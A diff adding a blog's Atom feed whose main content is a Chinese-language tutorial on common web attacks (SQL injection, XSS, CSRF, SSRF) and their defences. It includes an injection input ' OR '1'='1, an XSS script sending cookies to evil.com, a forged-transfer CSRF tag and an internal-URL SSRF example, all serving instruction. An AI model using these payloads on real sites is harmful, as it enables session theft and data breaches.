@@ -1,0 +1,376 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://scottalive.github.io</id>
+    <title>沉鱼的博客 • Posts by &#34;网络安全&#34; tag</title>
+    <link href="https://scottalive.github.io" />
+    <updated>2026-05-08T14:10:00.000Z</updated>
+    <category term="AI日报" />
+    <category term="AI" />
+    <category term="GitHub热门" />
+    <category term="人工智能" />
+    <category term="技术趋势" />
+    <category term="原则" />
+    <category term="个人详情" />
+    <category term="个人分享" />
+    <category term="坏习惯" />
+    <category term="Kubernetes" />
+    <category term="Helm" />
+    <category term="学习计划" />
+    <category term="心理学知识" />
+    <category term="网络安全" />
+    <category term="SQL注入" />
+    <category term="XSS" />
+    <category term="CSRF" />
+    <category term="DDoS" />
+    <category term="渗透测试" />
+    <category term="阿德勒心理学" />
+    <category term="自卑与超越" />
+    <category term="GPT-5.5" />
+    <category term="OpenAI" />
+    <category term="Codex" />
+    <category term="ClaudeCode" />
+    <category term="Gemini" />
+    <category term="开发工具" />
+    <category term="开源" />
+    <category term="编程笔记" />
+    <category term="Hermes" />
+    <category term="Agent" />
+    <category term="NousResearch" />
+    <category term="进阶" />
+    <category term="配置" />
+    <category term="高阶" />
+    <category term="自动化" />
+    <category term="LLM" />
+    <category term="RAG" />
+    <category term="知识库" />
+    <category term="OpenSRE" />
+    <category term="SRE" />
+    <category term="运维" />
+    <category term="故障排查" />
+    <category term="SSE" />
+    <category term="HTTP" />
+    <category term="接口开发" />
+    <category term="开发注意事项" />
+    <category term="力扣算法题" />
+    <category term="算法" />
+    <category term="动态规划" />
+    <category term="微服务" />
+    <category term="JavaSE" />
+    <category term="Java开发面试题" />
+    <category term="SpringBoot" />
+    <category term="Spring" />
+    <category term="python" />
+    <entry>
+        <id>https://scottalive.github.io/computer-science/network-security/common-attack-defense/</id>
+        <title>常见网络安全攻防技术</title>
+        <link rel="alternate" href="https://scottalive.github.io/computer-science/network-security/common-attack-defense/"/>
+        <content type="html">&lt;blockquote&gt;
+&lt;p&gt;网络安全的本质是攻防对抗。本文梳理了最常见的攻击手法与对应的防御策略，帮助开发者建立基本的安全意识。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;h2 id=&#34;一、攻防全景图&#34;&gt;&lt;a href=&#34;#一、攻防全景图&#34; class=&#34;headerlink&#34; title=&#34;一、攻防全景图&#34;&gt;&lt;/a&gt;一、攻防全景图&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flowchart TD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A[网络安全攻防] --&amp;gt; B[Web 应用攻击]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A --&amp;gt; C[网络层攻击]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A --&amp;gt; D[系统层攻击]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A --&amp;gt; E[社会工程]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    B --&amp;gt; B1[SQL 注入]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    B --&amp;gt; B2[XSS 跨站脚本]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    B --&amp;gt; B3[CSRF 跨站请求伪造]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    B --&amp;gt; B4[SSRF 服务端请求伪造]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    B --&amp;gt; B5[文件上传漏洞]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    C --&amp;gt; C1[DDoS 分布式拒绝服务]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    C --&amp;gt; C2[中间人攻击 MITM]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    C --&amp;gt; C3[DNS 劫持]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    C --&amp;gt; C4[端口扫描]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    D --&amp;gt; D1[缓冲区溢出]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    D --&amp;gt; D2[提权攻击]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    D --&amp;gt; D3[后门/Rootkit]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    E --&amp;gt; E1[钓鱼攻击]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    E --&amp;gt; E2[暴力破解]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    E --&amp;gt; E3[撞库攻击]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h2 id=&#34;二、Web-应用攻击&#34;&gt;&lt;a href=&#34;#二、Web-应用攻击&#34; class=&#34;headerlink&#34; title=&#34;二、Web 应用攻击&#34;&gt;&lt;/a&gt;二、Web 应用攻击&lt;/h2&gt;&lt;h3 id=&#34;2-1-SQL-注入-SQL-Injection&#34;&gt;&lt;a href=&#34;#2-1-SQL-注入-SQL-Injection&#34; class=&#34;headerlink&#34; title=&#34;2.1 SQL 注入 (SQL Injection)&#34;&gt;&lt;/a&gt;2.1 SQL 注入 (SQL Injection)&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt; 攻击者将恶意 SQL 语句拼接到应用输入中，欺骗数据库执行非授权操作。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击示例：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;-- 正常查询&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;-- 注入攻击（输入: 1&amp;#x27; OR &amp;#x27;1&amp;#x27;=&amp;#x27;1）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;-- 返回全部用户数据，完全绕过认证！&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sequenceDiagram&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    participant A as 攻击者&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    participant W as Web 应用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    participant DB as 数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A-&amp;gt;&amp;gt;W: 提交恶意输入 &amp;#x27; OR 1=1 --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    W-&amp;gt;&amp;gt;DB: 拼接 SQL: SELECT * FROM users WHERE name=&amp;#x27;&amp;#x27; OR 1=1 --&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DB--&amp;gt;&amp;gt;W: 返回所有用户数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    W--&amp;gt;&amp;gt;A: 数据泄露！&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;防御手段：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;措施&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;th&gt;优先级&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;参数化查询 &amp;#x2F; 预编译语句&lt;/td&gt;
+&lt;td&gt;使用 &lt;code&gt;?&lt;/code&gt; 占位符，SQL 与数据分离&lt;/td&gt;
+&lt;td&gt;✅ 必做&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ORM 框架&lt;/td&gt;
+&lt;td&gt;MyBatis、Hibernate、JPA 等天然防注入&lt;/td&gt;
+&lt;td&gt;✅ 推荐&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;输入校验&lt;/td&gt;
+&lt;td&gt;白名单校验，拒绝特殊字符&lt;/td&gt;
+&lt;td&gt;⚠️ 辅助&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;最小权限原则&lt;/td&gt;
+&lt;td&gt;数据库账号不给予 DROP&amp;#x2F;TRUNCATE 权限&lt;/td&gt;
+&lt;td&gt;✅ 必做&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;WAF (Web 应用防火墙)&lt;/td&gt;
+&lt;td&gt;拦截已知注入特征&lt;/td&gt;
+&lt;td&gt;⚠️ 辅助&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// ❌ 危险：字符串拼接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM users WHERE name = &amp;#x27;&amp;quot;&lt;/span&gt; + userName + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// ✅ 安全：参数化查询（JDBC PreparedStatement）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM users WHERE name = ?&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;PreparedStatement&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;ps&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; conn.prepareStatement(sql);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps.setString(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, userName);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h3 id=&#34;2-2-XSS-跨站脚本攻击-Cross-Site-Scripting&#34;&gt;&lt;a href=&#34;#2-2-XSS-跨站脚本攻击-Cross-Site-Scripting&#34; class=&#34;headerlink&#34; title=&#34;2.2 XSS 跨站脚本攻击 (Cross-Site Scripting)&#34;&gt;&lt;/a&gt;2.2 XSS 跨站脚本攻击 (Cross-Site Scripting)&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt; 攻击者在网页中注入恶意脚本，当其他用户浏览时脚本被执行，窃取 Cookie、Token 等敏感信息。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;三种类型：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flowchart LR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    XSS[XSS] --&amp;gt; Reflected[反射型 XSS]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    XSS --&amp;gt; Stored[存储型 XSS&amp;lt;br/&amp;gt;最危险]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    XSS --&amp;gt; DOM[DOM-based XSS]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Reflected --&amp;gt;|一次性| RefEx[&amp;quot;?q=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stored --&amp;gt;|持久化| StoEx[&amp;quot;评论/留言框&amp;lt;br/&amp;gt;嵌入恶意脚本&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DOM --&amp;gt;|前端渲染| DOMEx[&amp;quot;URL 片段注入&amp;lt;br/&amp;gt;前端 eval 执行&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;攻击示例：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&amp;lt;!-- 评论框中输入恶意脚本 --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;  &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;location&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://evil.com/steal?cookie=&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;防御手段：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;措施&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;输出编码 &amp;#x2F; 转义&lt;/td&gt;
+&lt;td&gt;HTML 实体编码：&lt;code&gt;&amp;lt;&lt;/code&gt; → &lt;code&gt;&amp;amp;lt;&lt;/code&gt;，&lt;code&gt;&amp;gt;&lt;/code&gt; → &lt;code&gt;&amp;amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Content-Security-Policy&lt;/td&gt;
+&lt;td&gt;CSP HTTP 头限制脚本执行来源&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;HttpOnly Cookie&lt;/td&gt;
+&lt;td&gt;JavaScript 无法读取 Cookie&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;输入过滤&lt;/td&gt;
+&lt;td&gt;过滤 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;、&lt;code&gt;onerror=&lt;/code&gt; 等危险标签&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# CSP 响应头示例：只允许同源脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Security-Policy&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;default-src &amp;#x27;self&amp;#x27;; script-src &amp;#x27;self&amp;#x27; https://trusted.cdn.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h3 id=&#34;2-3-CSRF-跨站请求伪造-Cross-Site-Request-Forgery&#34;&gt;&lt;a href=&#34;#2-3-CSRF-跨站请求伪造-Cross-Site-Request-Forgery&#34; class=&#34;headerlink&#34; title=&#34;2.3 CSRF 跨站请求伪造 (Cross-Site Request Forgery)&#34;&gt;&lt;/a&gt;2.3 CSRF 跨站请求伪造 (Cross-Site Request Forgery)&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt; 攻击者伪造请求，诱导已登录用户点击，在用户不知情的情况下以用户身份执行操作。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sequenceDiagram&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    participant U as 用户(已登录银行)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    participant A as 攻击者网站&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    participant B as 银行网站&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    U-&amp;gt;&amp;gt;B: 登录，获得 Cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    U-&amp;gt;&amp;gt;A: 访问恶意网站&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A-&amp;gt;&amp;gt;B: &amp;lt;img src=&amp;#x27;/transfer?to=attacker&amp;amp;amount=10000&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Note over U,B: 浏览器自动携带 Cookie！&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    B--&amp;gt;&amp;gt;A: 转账成功（用户不知情）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;防御手段：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;措施&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;CSRF Token&lt;/td&gt;
+&lt;td&gt;表单中嵌入随机 token，服务端校验&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;SameSite Cookie&lt;/td&gt;
+&lt;td&gt;设置 &lt;code&gt;SameSite=Strict&lt;/code&gt;，跨站不发送 Cookie&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;验证码&lt;/td&gt;
+&lt;td&gt;敏感操作要求输入验证码&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Referer 校验&lt;/td&gt;
+&lt;td&gt;检查请求来源是否合法&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 生成 CSRF Token&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;csrfToken&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; UUID.randomUUID().toString();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;session.setAttribute(&lt;span class=&#34;string&#34;&gt;&amp;quot;csrf_token&amp;quot;&lt;/span&gt;, csrfToken);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 校验&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;requestToken&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; request.getParameter(&lt;span class=&#34;string&#34;&gt;&amp;quot;csrf_token&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!requestToken.equals(session.getAttribute(&lt;span class=&#34;string&#34;&gt;&amp;quot;csrf_token&amp;quot;&lt;/span&gt;))) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;SecurityException&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;CSRF 攻击检测！&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;JSESSIONID=xxx; SameSite=Strict; HttpOnly; Secure&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h3 id=&#34;2-4-SSRF-服务端请求伪造-Server-Side-Request-Forgery&#34;&gt;&lt;a href=&#34;#2-4-SSRF-服务端请求伪造-Server-Side-Request-Forgery&#34; class=&#34;headerlink&#34; title=&#34;2.4 SSRF 服务端请求伪造 (Server-Side Request Forgery)&#34;&gt;&lt;/a&gt;2.4 SSRF 服务端请求伪造 (Server-Side Request Forgery)&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt; 攻击者利用服务器端发起的请求功能，访问内网资源或进行端口扫描。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;常见场景：&lt;/strong&gt; 图片抓取、URL 预览、Webhook 回调等。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;防御手段：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;限制服务器发起的请求只能访问外部白名单域名&lt;/li&gt;
+&lt;li&gt;禁止访问内网 IP 段（127.0.0.1、10.x.x.x、172.16-31.x.x、192.168.x.x）&lt;/li&gt;
+&lt;li&gt;禁用 &lt;code&gt;file://&lt;/code&gt;、&lt;code&gt;gopher://&lt;/code&gt; 等非 HTTP 协议&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 危险：直接请求用户传入的 URL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fetch_url&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;url&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; requests.get(url)  &lt;span class=&#34;comment&#34;&gt;# 攻击者传入 http://127.0.0.1:3306&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安全：白名单校验&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ALLOWED_DOMAINS = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;api.trusted.com&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;img.cdn.com&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fetch_url&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;url&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parsed = urlparse(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; parsed.hostname &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; ALLOWED_DOMAINS:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;raise&lt;/span&gt; ValueError(&lt;span class=&#34;string&#34;&gt;&amp;quot;非法请求来源&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span 